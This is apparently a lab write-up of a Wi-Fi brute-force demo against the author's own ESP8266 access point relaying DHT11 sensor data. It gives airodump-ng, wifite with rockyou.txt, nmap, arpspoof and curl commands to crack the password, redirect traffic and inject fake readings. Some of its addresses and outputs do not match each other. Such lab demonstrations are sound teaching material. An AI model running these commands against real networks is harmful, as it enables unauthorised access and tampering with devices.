### rockyou.txt index 2001 as password

Demo : Brute-force attack 
To :  Find out wifi password

***

index 2001
   
    sed -n 2001p rockyou.txt 

output
      
    blessed1
    
set wifi ap ssid and password, ESPap is the target attack ap essid

    /* Set these to your desired credentials. */
    const char *ssid = "ESPap";
    const char *password = "kupal";

***

### display and server serial output

    screen /dev/ttyUSB0 115200
    
    Configuring access point...AP IP address: 192.168.4.1

	
### the wifi client to send dht11 to server

    screen /dev/ttyUSB1 115200
    
    Connecting to ESPap
    .........
    WiFi connected
    IP address: 
    192.168.4.2
    =================================
    Sample DHT11...
    Sample OK: 30 *C, 13 %
    connecting to 192.168.4.1
    Requesting URL: /dht11?temp=30&humi=13
    HTTP/1.1 200 OK
    Content-Type: text/html
    Connection: close
    Content-Length: 25
    Connection: close
    Access-Control-Allow-Origin: *

    {"temp":"30","humi":"13"}
    closing connection
    
### time to hack

### find out the ap..

    
    airmon-ng start wlan0   
    airodump-ng wlan0mon
    
### crack the ap password

     # use aircrack-ng as your like
     wifite -i wlan0 -e ESPap --dict rockyou.txt --crack

### nmap scan device

     nmap -v -sn 192.168.2.0/24

### connect to ESPap by cracked password

     turn the orignal package route to a invalid host or our host..

     arpspoof 192.168.2.2 192.168.2.255
     
### use curl send fake temp and humi value

   
    curl -v http://192.168.4.1/dht11?temp=99&humi=99

output

	*   Trying 192.168.4.1...
	* TCP_NODELAY set
	* Connected to 192.168.4.1 (192.168.4.1) port 80 (#0)
	> GET /dht11?temp=12humi=33 HTTP/1.1
	> Host: 192.168.4.1
	> User-Agent: curl/7.52.1
	> Accept: */*
	> 
	< HTTP/1.1 200 OK
	< Content-Type: text/html
	< Connection: close
	< Content-Length: 32
	< Connection: close
	< Access-Control-Allow-Origin: *
	< 
	* Curl_http_done: called premature == 0
	* Closing connection 0
	{"temp":"99","humi":"99"}
    

